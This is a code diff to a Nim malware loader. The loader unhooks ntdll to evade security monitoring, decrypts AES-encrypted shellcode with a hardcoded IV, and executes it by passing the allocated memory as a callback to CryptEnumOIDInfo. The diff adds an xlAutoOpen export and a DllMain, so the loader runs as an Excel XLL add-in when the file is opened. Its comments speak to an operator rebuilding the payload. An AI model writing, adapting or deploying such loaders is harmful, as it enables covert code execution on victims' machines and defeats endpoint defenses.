@@ -64,6 +64,8 @@ proc ntdllunhook(): bool =
 
 proc shellcodeCallback(shellcode: openarray[byte]): void =
 
+
+
     let rPtr = VirtualAlloc(
         NULL,
         cast[SIZE_T](shellcode.len),
@@ -78,15 +80,16 @@ proc shellcodeCallback(shellcode: openarray[byte]): void =
         cast[SIZE_T](shellcode.len),
     )
 
-    CertEnumSystemStore(
-        CERT_SYSTEM_STORE_CURRENT_USER,
-        NULL,
-        NULL,
-        cast[PFN_CERT_ENUM_SYSTEM_STORE](rPtr),
+    CryptEnumOIDInfo(
+        cast[DWORD](NULL),
+        cast[DWORD](NULL),
+        cast[PFN_CRYPT_ENUM_OID_INFO](NULL), #yes, you need a null here....
+        cast[PFN_CRYPT_ENUM_OID_INFO](rPtr)
     )
 
-when isMainModule:
-        let shellcode_base64_encrypted = "REPLACE_ME" 
+proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
+   when isMainModule:
+        let shellcode_base64_encrypted = "REPLACE_ME" #the easy way! replace me back if you need to remake your payload
         var result = ntdllunhook()  #so we need to assign it to a variable even though its not used. But if you discard it, it won't work... O_o
         var encodedIV: string = "t47unCor+GR9+cD+2d6FlQ==" #base64 encoded IV. hardcoded...fix this later
         var dctx: CTR[aes256]
@@ -112,3 +115,10 @@ when isMainModule:
         
         #fire!
         shellcodeCallback(dectext)
+
+proc NimMain() {.cdecl, importc.}
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain()
+
+  return true
